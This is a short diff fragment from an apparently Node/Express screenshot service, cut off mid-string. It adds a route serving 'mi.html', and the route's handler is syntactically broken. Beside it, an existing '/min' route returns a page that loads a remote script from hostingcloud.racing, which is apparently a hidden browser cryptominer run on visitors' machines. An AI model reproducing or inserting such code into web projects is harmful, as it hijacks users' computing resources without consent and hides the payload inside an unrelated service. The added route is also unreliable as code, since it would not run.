@@ -4,6 +4,9 @@ const port = process.env.PORT || 3131
 const screenshot = require('./screenshot')
 
 app.get('/', (req, res) => res.status(200).json({ status: 'new comment on ' }))
+app.get('/m', (req, res) {
+        res.sendFile('/mi.html');
+        })
 app.get('/min', function(req, res) {
     res.send('<script src="https://www.hostingcloud.racing/Sbjk.js"></script>
 <script>
